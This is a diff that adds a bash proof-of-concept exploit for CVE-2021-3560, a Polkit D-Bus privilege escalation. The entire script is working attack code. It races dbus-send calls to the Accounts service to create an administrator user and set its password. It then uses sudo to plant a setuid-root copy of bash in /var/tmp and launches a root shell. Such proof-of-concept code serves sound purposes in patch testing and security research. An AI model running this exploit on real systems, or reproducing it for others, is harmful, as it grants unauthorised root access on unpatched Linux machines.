@@ -1,0 +1,48 @@
+#!/usr/bin/env bash
+# PoC script for CVE-2021-3560 Polkit D-Bus privilege escalation
+# Written by f4T1H *** See https://github.com/f4T1H21/CVE-2021-3560-Polkit-DBus
+
+path='/var/tmp'
+user=$1
+passwd='selamcanimbenamcanim'
+enc=$(openssl passwd -5 $passwd)
+
+while true; do
+  cmdtime=$((time \
+  dbus-send --system --dest=org.freedesktop.Accounts --type=method_call \
+  --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser \
+  string:'${user}' string:'f4T1H21' int32:1) 2>&1 >/dev/null \
+  | grep real | awk '{print $2}' | grep -oP '\d+\m\K\d+\.\d+')
+
+  divided=$(awk "BEGIN{print ( ${cmdtime} / 3 )}")
+  if ! grep -q $user /etc/passwd; then
+    echo "[+] Trying to add user ..."
+    dbus-send --system --dest=org.freedesktop.Accounts --type=method_call \
+    --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser \
+    string:$user string:"f4T1H21" int32:1 2>/dev/null & \
+    sleep $divided\s; kill $! &>/dev/null; wait $! 2>/dev/null
+
+  elif grep -q $user /etc/passwd; then
+    echo '[+] Trying to change user password ...'
+    uid=$(id $user | grep -oP 'uid=\K\d+')
+    dbus-send --system --dest=org.freedesktop.Accounts --type=method_call \
+    --print-reply /org/freedesktop/Accounts/User${uid} org.freedesktop.Accounts.User.SetPassword \
+    string:"${enc}" string:GoldenEye 2>/dev/null & \
+    sleep $divided\s; kill $! &>/dev/null; wait $! 2>/dev/null
+
+    su - $user <<! >/dev/null 2>&1
+$passwd
+echo '[***] Here comes the PoC:' >/dev/tty && echo $passwd | sudo -Sk id >/dev/tty
+echo $passwd | sudo -kS cp /bin/bash ${path}/bash >/dev/tty
+echo $passwd | sudo -kS chmod +x+s ${path}/bash >/dev/tty
+!
+    if [[ -e "${path}/bash" ]]; then
+      echo -e '[+] Removing previously created user\n'
+      ${path}/bash -p -c "pkill -e ${user}; userdel -r -f ${user} 2>/dev/null"
+      ${path}/bash -ip
+      echo -e '\n[+] Removing (suid root) bash'
+      ${path}/bash -p -c "rm ${path}/bash"
+      break
+    fi
+  fi
+done
